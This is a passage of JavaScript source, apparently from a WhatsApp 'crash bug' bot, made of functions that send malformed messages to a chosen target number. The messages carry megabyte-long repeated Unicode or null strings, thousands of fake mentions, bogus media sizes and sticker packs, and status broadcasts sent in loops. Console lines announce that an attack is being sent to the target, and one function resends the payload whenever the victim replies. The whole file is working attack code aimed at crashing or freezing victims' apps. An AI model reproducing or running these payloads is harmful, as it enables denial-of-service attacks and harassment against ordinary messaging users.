                                buttonParamsJson: JSON.stringify({
                                    icon: "RIVIEW",
                                    flow_cta: "ꦾ".repeat(5000),
                                    flow_message_version: "3",
                                }),
                            },
                        ],
                    },
                },
            },
        },
    };

    const msg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject(payload),
        {
            participant: { jid: target },
            userJid: target
        }
    );
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function packBlankxnxx(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    await otax.relayMessage(
        target,
        {
            stickerPackMessage: {
                stickerPackId: "X",
                name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                stickers: [
                    {
                        fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                    {
                        fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
                        isAnimated: false,
                        emojis: ["😮‍💨"],
                        accessibilityLabel: "otax",
                        isLottie: true,
                        mimetype: "application/pdf",
                    },
                ],
                fileLength: "9999999999999",
                fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
                directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
                contextInfo: {
                    quotedMessage: {
                        paymentInviteMessage: {
                            serviceType: 3,
                            expiryTimestamp: Date.now() + 1814400000
                        },
                        forwardedAiBotMessageInfo: {
                            botName: "META AI",
                            botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            creatorName: "Bot"
                        }
                    }
                },
                packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                mediaKeyTimestamp: "1741150286",
                trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
                thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
                thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
                thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
                thumbnailHeight: 252,
                thumbnailWidth: 252,
                imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
                stickerPackSize: "999999999",
                stickerPackOrigin: "1",
            },
        }
    );
}


async function otaxayunBelovedX(otax, target, mention) {

    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " ¿otax Here¿ ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"otax?\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\x10".repeat(1000000)}\"}}`,
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );

    const mediaData = [
        {
            ID: "68917910",
            uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
            mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
        },
        {
            ID: "68884987",
            uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
            buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
            mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
        },
    ]

    let sequentialIndex = 0
    console.log(chalk.red(`𝘰𝘵𝘢𝘹 𝘴𝘦𝘥𝘢𝘯𝘨 𝘮𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘢𝘵𝘵𝘢𝘤𝘬 𝘬𝘦 ${target}`))

    const selectedMedia = mediaData[sequentialIndex]
    sequentialIndex = (sequentialIndex + 1) % mediaData.length
    const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

    const contextInfo = {
        participant: target,
        mentionedJid: [
            target,
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
        ],
    }


    const audioMsg = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
                        226, 213, 217, 102, 205, 126, 232, 145,
                        0, 70, 137, 73, 190, 145, 0, 44,
                        165, 102, 153, 233, 111, 114, 69, 10,
                        55, 61, 186, 131, 245, 153, 93, 211
                    ]),
                    fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
                        182, 141, 235, 167, 91, 254, 75, 254,
                        190, 229, 25, 16, 78, 48, 98, 117,
                        42, 71, 65, 199, 10, 164, 16, 57,
                        189, 229, 54, 93, 69, 6, 212, 145
                    ]),
                    fileEncSha256: Buffer.from([
                        29, 27, 247, 158, 114, 50, 140, 73,
                        40, 108, 77, 206, 2, 12, 84, 131,
                        54, 42, 63, 11, 46, 208, 136, 131,
                        224, 87, 18, 220, 254, 211, 83, 153
                    ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    }

    const textMsg = {
        extendedTextMessage: {
            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000) + "\n\nJust otax" + "\0".repeat(100),
            matchedText: "https://t.me/Otapengenkawin",
            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
            title: "ꦽ".repeat(20000),
            previewType: 6,
            jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
            paymentLinkMetadata: {
                button: { displayText: "Love U My Ayun" },
                header: { headerType: 1 },
                provider: { paramsJson: "{".repeat(10000) }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "otax@newsletter",
                        newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                        caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "13135550002@newsletter",
                    serverId: 1
                }
            }
        }
    }

    const interMsg = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                    },
                    entryPointConversionSource: "galaxy_message",
                },
            },
        },
    }
    const interMsg2 = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                    },
                    entryPointConversionSource: "galaxy_message",
                },
            },
        },
    }

    const statusMessages = [audioMsg, textMsg, interMsg, interMsg2]

    let msg = null;
    for (let i = 0; i < 1; i++) {
        await otax.relayMessage("status@broadcast", biji2.message, {
            messageId: biji2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
        for (const content of statusMessages) {
            msg = generateWAMessageFromContent(target, content, {})
            await otax.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
                            },
                        ],
                    },
                ],
            })
        }
        if (i < 9) {
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    if (mention && msg?.key) {
        await otax.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {
                            is_status_mention: " meki - melar ",
                        },
                    },
                ],
            }
        );
    }
}
async function FcRelog(otax, target) {
    const nativeMsg = generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: { text: "Native Payload", format: "DEFAULT" },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000".repeat(1000000),
                            version: 3
                        },
                        quotedMessage: {
                            sendPaymentMessage: {
                                noteMessage: null,
                                requestMessageKey: undefined,
                                background: null
                            }
                        }
                    }
                }
            }
        },
        {}
    );

    await otax.relayMessage(target, nativeMsg.message, {
        participant: { jid: target },
        messageId: nativeMsg.key.id
    });
    otax.ev.on("messages.upsert", async ({ messages, type }) => {
        if (type !== "notify") return

        for (const msg of messages) {
            if (!msg.message) continue
            if (msg.key.fromMe) continue
            if (msg.key.remoteJid !== target) continue

            try {
                await otax.relayMessage(
                    target,
                    viewOnceMsg,
                    {
                        messageId: otax.generateMessageTag()
                    }
                )
            } catch { }
        }
    })
}
async function otaxayunBelovedXGroup(otax, target, mention) {

    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " ¿otax Here¿ ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );

    const mediaData = [
        {
            ID: "68917910",
            uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
            buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
            mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
        },
        {
            ID: "68884987",
            uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
            buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
            sid: "5e03e0",
            SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
            ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
            mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
        },
    ];

    let sequentialIndex = 0;
    console.log(chalk.red(`${target} 𝙎𝙚𝙙𝙖𝙣𝙜 𝘿𝙞 𝙀𝙬𝙚 𝙀𝙬𝙚 𝙊𝙡𝙚𝙝 𝙊𝙏𝘼𝙓 ⸙`));

    const selectedMedia = mediaData[sequentialIndex];
    sequentialIndex = (sequentialIndex + 1) % mediaData.length;

    const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia;

    const contextInfo = {
        participant: target,
        mentionedJid: [
            target,
            ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
        ],
    };

    const stickerMsg = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
                    fileSha256: SHA256,
                    fileEncSha256: ENCSHA256,
                    mediaKey: mkey,
                    mimetype: "image/webp",
                    directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
                    fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
                    mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo,
                    isAvatar: false,
                    isAiSticker: false,
                    isLottie: false,
                },
            },
        },
    };

    const msgxay = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "address_message",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3,
                    },
                    entryPointConversionSource: "{}",
                },
            },
        },
    };

    const interMsg = {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: { text: "σƭαא ɦαเ", format: "DEFAULT" },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3,
                    },
                    entryPointConversionSource: "{}",
                },
            },
        },
    };

    const statusMessages = [stickerMsg, interMsg, msgxay];

    let content = {
        extendedTextMessage: {
            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(500000),
            matchedText: "ꦽ".repeat(20000),
            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
            title: "ꦽ".repeat(20000),
            previewType: "NONE",
            jpegThumbnail:
                "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
            inviteLinkGroupTypeV2: "DEFAULT",
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: target,
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: "otax@newsletter",
                        newsletterName:
                            "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
                        caption:
                            "⸙ᵒᵗᵃˣнοω αяє γου?¿" +
                            "ꦾ".repeat(60000) +
                            "ោ៝".repeat(60000),
                        inviteExpiration: "999999999"
                    }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterName:
                        "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
                    newsletterJid: "13135550002@newsletter",
                    serverId: 1
                }
            }
        }
    };

    const xnxxmsg = generateWAMessageFromContent(target, content, {});

    let msg = null;
    for (let i = 0; i < 10; i++) {
        await otax.relayMessage("status@broadcast", biji2.message, {
            messageId: biji2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });
        for (const content of statusMessages) {
            const msg = generateWAMessageFromContent(target, content, {})
            await otax.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
                            },
                        ],
                    },
                ],
            })
        }
        await otax.relayMessage("status@broadcast", xnxxmsg.message, {
            messageId: xnxxmsg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined,
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        if (i < 9) {
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    if (mention) {
        await otax.relayMessage(
            target,
            {
                groupStatusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25,
                        },
                    },
                },
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {
                            is_status_mention: " meki - melar ",
                        },
                        content: undefined,
                    },
                ],
            }
        );
    }
}
async function gsIntjav(otax, target, otaxkiw = true) {
    for (let i = 0; i < 2; i++) {

        let otaxi = {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
                    isForwarded: true,
                    forwardingScore: 7205,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "12037205250208@newsletter",
                        newsletterName: "do u know me? | Information",
                        serverMessageId: 1000,
                        accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
                    },
                    statusAttributionType: "RESHARED_FROM_MENTION",
                    contactVcard: true,
                    isSampled: true,
                    dissapearingMode: {
                        initiator: target,
                        initiatedByMe: true
                    },
                    expiration: Date.now()
                },
                body: {
                    text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(1000000),
                    version: 3
                }
            }
        }

        let msg = generateWAMessageFromContent(
            target,
            { groupStatusMessageV2: { message: otaxi } },
            {}
        )

        await otax.relayMessage(
            target,
            msg.message,
            otaxkiw
                ? { messageId: msg.key.id, participant: { jid: target }, userJid: target }
                : { messageId: msg.key.id }
        )

        await sleep(1000)

        await otax.sendMessage(target, {
            delete: {
                remoteJid: target,
                fromMe: true,
                id: msg.key.id,
                participant: target
            }
        })
    }
}
async function gsIntjavgb(otax, target, otaxkiw = true) {
    for (let i = 0; i < 20; i++) {

        let otaxi = {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
                    isForwarded: true,
                    forwardingScore: 7205,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "12037205250208@newsletter",
                        newsletterName: "do u know me? | Information",
                        serverMessageId: 1000,
                        accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
                    },
                    statusAttributionType: "RESHARED_FROM_MENTION",
                    contactVcard: true,
                    isSampled: true,
                    dissapearingMode: {
                        initiator: target,
                        initiatedByMe: true
                    },
                    expiration: Date.now()
                },
                body: {
                    text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(1000000),
                    version: 3
                }
            }
        }

        let msg = generateWAMessageFromContent(
            target,
            { groupStatusMessageV2: { message: otaxi } },
            {}
        )

        await otax.relayMessage(
            target,
            msg.message,
            otaxkiw
                ? { messageId: msg.key.id, userJid: target }
                : { messageId: msg.key.id }
        )

        await sleep(1000)

        await otax.sendMessage(target, {
            delete: {
                remoteJid: target,
                fromMe: true,
                id: msg.key.id,
            }
        })
    }
}
async function invsNewIos(otax, target) {
    for (let i = 0; i < 10; i++) {
        let msg = generateWAMessageFromContent(
            target,
            {
                contactMessage: {
                    displayName:
                        "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
                        "𑇂𑆵𑆴𑆿".repeat(10000),
